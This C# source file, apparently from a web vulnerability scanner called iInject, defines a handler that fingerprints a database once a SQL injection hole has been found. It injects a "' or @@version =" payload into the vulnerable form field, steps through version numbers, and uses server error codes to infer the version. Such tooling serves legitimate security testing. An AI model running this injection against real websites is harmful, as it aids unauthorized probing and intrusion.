using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace iInject
{
    /// <summary>
    /// checks the SQL version
    /// </summary>
	class VersionDetect : IVulnerabilityHandler
    {

        /// <summary>
        /// inputs a string into the form causing errors on wrong version until correct version found
		/// returns an int that is the version number
        /// </summary>
        /// obj vulnerability details
		/// and session that was detected as parameters
        public async void HandleVulnerability(VulnerabilityDetails Details,InjectionSession successful) {
			IVulnerabilityScanner scanner = Details.Scanner;
			if(scanner.VulnerabilityName.Equals("Sql Injection"))
			{   
				for(int i=1;i<20;i++){
				var Parser = successful.Crawler.Parser;
				WebFormControl Control = Details.VulnerableControl;
				var OldValue = Control.Value;
				var NewValue = Control.GenerateDefaultValue(true);
				try {
					Control.Value = NewValue + "' or @@version =" +i;
					var Response = await Details.Form.SubmitAsync(Parser, TimeSpan.FromSeconds(30));
					if(!((int)Response.StatusCode >= 500)){
						Console.WriteLine("affected database was version " + i);
					}
				} finally {
					Control.Value = OldValue;
				}
			}
			}
		}
			 
        }

    }

